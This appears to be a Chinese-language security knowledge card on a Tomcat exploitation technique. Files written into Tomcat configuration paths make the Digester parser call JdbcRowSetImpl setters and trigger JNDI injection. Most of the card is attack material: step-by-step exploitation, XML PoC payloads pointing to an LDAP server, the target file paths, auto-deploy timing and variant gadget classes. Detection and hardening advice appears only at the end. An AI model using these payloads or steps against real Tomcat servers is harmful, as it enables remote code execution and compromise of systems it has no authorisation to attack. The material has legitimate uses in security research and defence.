---
id: web-java-component-tomcat-xml-digester-setter-jndi
title: Tomcat XML 配置经 Digester 自动调用 setter 触发 JNDI 注入
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-xml-digester-setter-jndi
aliases:
- Tomcat XML 配置 JNDI
- Tomcat context.xml Manager JNDI
- server.xml Listener JNDI
- Digester SetPropertiesRule 利用
- Tomcat 热部署 XML 触发
tags:
- java
- tomcat
- jndi
- xml
- digester
- file-write
- jdbcrowsetimpl
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:28:25+08:00'
  notes: 已对照原文与 35 张图核对：图01-05 Bootstrap→Catalina.load 创建 Digester 解析 server.xml；图06-11 ObjectCreateRule.loadClass/newInstance 与 SetPropertiesRule→IntrospectionUtils.setProperty 反射 setter（图11 为 JdbcRowSetImpl.setDataSourceName(ldap://...)）；图12/13 server.xml Listener 触发并弹出计算器；图14-21 deployDescriptors 解析 conf/Catalina/<host>/*.xml 的 Context/Manager 并弹计算器；图22-26 deployWARs 解析 META-INF/context.xml；图27-33 ContainerBackgroundProcessor periodic→check→deployApps 约 10 秒自动部署。卡片将 tomcat-catalina 8.5.0 从 affected_versions 清除（仅为原文测试依赖，不是受影响区间）。PoC 未在本机执行。
---

## 一句话结论

Tomcat 用 Digester 解析 `conf/server.xml`、`conf/Catalina/<host>/*.xml` 与 WAR 内 `META-INF/context.xml` 时，会按 XML 的 `className` 反射实例化任意类并调用其 setter；若攻击者能写入一个 XML 到这些位置，用 `<Manager className="com.sun.rowset.JdbcRowSetImpl" dataSourceName="ldap://..." autoCommit="true"/>` 即可在解析时触发 JNDI 注入。

## 原理

- Tomcat 的 `Catalina.load()` 创建 `Digester` 并解析 `conf/server.xml`。Digester 为每类标签注册规则：`ObjectCreateRule.begin` 读取 `className` 属性，用 `digester.getClassLoader().loadClass(realClassName)` 加载并 `newInstance()`；随后 `SetPropertiesRule.begin` 遍历该标签的其余属性，调用 `IntrospectionUtils.setProperty(instance, name, value)`。
- `IntrospectionUtils.setProperty` 把属性名转成 `setXxx`，通过反射查找只有一个 `String` 参数的方法并 `invoke`。整个过程没有“可实例化类白名单”，也没有“可调用 setter 白名单”，因此 XML 作者可以决定实例化哪个类、调用哪些 setter。
- `com.sun.rowset.JdbcRowSetImpl` 是 JDK 自带的危险类：`setDataSourceName(String)` 保存 JNDI URL，`setAutoCommit(boolean)` 在 `autoCommit=true` 时调用内部的 `connect()`，后者执行 `InitialContext.lookup(dataSourceName)`。把 `dataSourceName` 指向攻击者控制的 LDAP/RMI 服务，即可触发 JNDI 注入并加载远程或本地 gadget。
- 解析入口不止启动时的 `server.xml`：
  - `HostConfig.deployDescriptors` 解析 `conf/Catalina/<host>/*.xml` 上下文描述符，`<Context><Manager .../></Context>` 的属性会走同样的 setter 调用；
  - `HostConfig.deployWARs` 解析 WAR 内的 `META-INF/context.xml`；
  - `ContainerBackgroundProcessor` 每约 10 秒调用 `HostConfig` 的 periodic 事件 → `check()` → `deployApps()` → `deployDescriptors`/`deployWARs`，因此写入 XML 后不必重启 Tomcat，等待自动部署线程即可触发。
- 属性顺序通常按 XML 文档顺序处理：`dataSourceName` 应先于 `autoCommit`，否则 `setAutoCommit(true)` 时还没有目标 URL，`connect()` 可能失败。实际顺序以目标解析器为准，PoC 按 `dataSourceName` 在前编写。

## 触发条件

- 目标为 Tomcat（原文测试 `tomcat-catalina 8.5.0`），且 `conf/server.xml`、`conf/Catalina/<host>/` 或 `webapps`/WAR 的 `META-INF` 对攻击者可写。
- 存在任意文件写/上传漏洞，且允许写入 `.xml` 文件（后缀白名单包含 `.xml`，或可通过目录穿越落到目标目录）；Tomcat 进程对目标目录有写权限。
- 目标可访问攻击者的 LDAP/RMI 服务（或可利用本地 JNDI gadget）；JDK 的 JNDI 远程 codebase 信任策略未阻断该利用（JDK 8u191+/11.0.1+ 默认 `trustURLCodebase=false`，需改用本地 gadget 或目标已有可利用的 LDAP 返回对象）。
- 对于 `conf/Catalina/<host>/` 和 WAR 场景，`HostConfig` 的 `deployOnStartup`/`autoDeploy` 已启用（默认启用）；否则需要重启或手动触发部署。

## 利用步骤

1. 找到可写 XML 的入口：任意文件上传 + 后缀白名单含 `.xml`，或目录穿越写文件；目标路径优先 `conf/Catalina/localhost/`、`webapps/<app>/META-INF/context.xml`，也可尝试 `conf/server.xml`（需重启）。
2. 构造 XML，根元素使用 Tomcat 期望的 `Context`（context descriptor）或 `Server/Listener`（server.xml），内部放入 `JdbcRowSetImpl` 的 `className`、`dataSourceName`、`autoCommit` 属性。
3. 启动恶意 LDAP/RMI 服务，返回可执行的 gadget（或使用目标已有的本地 gadget）。
4. 写入 XML；context descriptor/WAR 场景等待约 10 秒的自动部署线程，server.xml 场景重启 Tomcat。
5. 观察 LDAP 回连与命令执行结果。

## PoC

```xml
<?xml version='1.0' encoding='utf-8'?>
<Context>
    <Manager className="com.sun.rowset.JdbcRowSetImpl"
             dataSourceName="ldap://127.0.0.1:8085/SbfXuVhz"
             autoCommit="true"/>
</Context>
```

```text
# server.xml 形式（需重启，Listener 标签同样走 ObjectCreateRule + SetPropertiesRule）：
<Server port="8005" shutdown="SHUTDOWN">
    <Listener className="com.sun.rowset.JdbcRowSetImpl"
              dataSourceName="ldap://127.0.0.1:8085/SbfXuVhz"
              autoCommit="true"/>
    ...
</Server>
```

```text
# 写入位置二选一：
#   1) conf/Catalina/localhost/1.xml        -> HostConfig.deployDescriptors 解析
#   2) webapps/<app>/META-INF/context.xml   -> HostConfig.deployWARs 解析
# 写完后等待 ContainerBackgroundProcessor 的 periodic check（默认约 10s），
# 或重启 Tomcat。
```

```text
# 关键调用栈（节选）
Digester.startElement
  -> ObjectCreateRule.begin        # loadClass + newInstance
  -> SetPropertiesRule.begin       # 遍历属性
     -> IntrospectionUtils.setProperty
        -> JdbcRowSetImpl.setDataSourceName("ldap://...")
        -> JdbcRowSetImpl.setAutoCommit(true)
           -> JdbcRowSetImpl.connect()
              -> InitialContext.lookup("ldap://...")
```

## 变体与关联

- 变体：任何“无参构造 + 危险 setter”的类都可替换 `JdbcRowSetImpl`，例如 setter 内触发 `URL.openConnection`、`ScriptEngine.eval`、文件写入、命令执行；JNDI 只是最常见的一种。
- 变体：`<Listener>`、`<Manager>`、`<Valve>`、`<Realm>` 等标签都可能被 Digester 处理；不同标签对应的 Tomcat 规则不同，但 `className` + 属性赋值这一核心机制相同。
- 变体：写入 WAR 的 `META-INF/context.xml` 需要触发 WAR 重新部署；写入 `conf/Catalina/localhost/*.xml` 依赖自动部署线程，通常无需重启。
- 关联：[[web-generic-file-upload-ueditor-filepathformat-traversal]]（本文使用的 UEditor `filePathFormat` 目录穿越写 XML 投递方式）；[[web-java-deser-fastjson-jdbc-rowset]]（`JdbcRowSetImpl` 作为 JNDI gadget 的另一入口）；`web/java/deserialization/jndi` 下的 JNDI 高版本绕过卡片。
- 边界：目标目录不可写、Tomcat 关闭 `autoDeploy`/`deployOnStartup` 且不重启、JDK 阻断 JNDI 远程 codebase、或 XML 属性顺序导致 `autoCommit` 先于 `dataSourceName` 时链路可能失败；Tomcat 版本差异可能改变 Digester 规则，需按目标版本验证。

## 检测与防御

- 检测：监控 `conf/server.xml`、`conf/Catalina/*/`、`webapps/**/META-INF/context.xml` 的新增/修改；对 XML 中出现 `JdbcRowSetImpl`、`dataSourceName`、`autoCommit`、`ldap://`、`rmi://` 的组合告警；监控 Tomcat 解析 XML 后的 JNDI 外连与异常类加载。
- 修复：修复任意文件写/上传与目录穿越；上传目录移出 Tomcat 配置与 webapps 目录，后缀白名单移除 `.xml` 等可解析类型；对上传文件做内容与路径规范化校验。
- 加固：生产环境关闭不必要的 `autoDeploy`/`deployOnStartup`（`Host` 的 `autoDeploy="false" deployOnStartup="false"`），需要部署时走受控流程；限制 Tomcat 进程对配置目录的写权限；升级 JDK 并保持 JNDI 远程 codebase 关闭；使用 `catalina.properties`/安全策略限制可加载类。
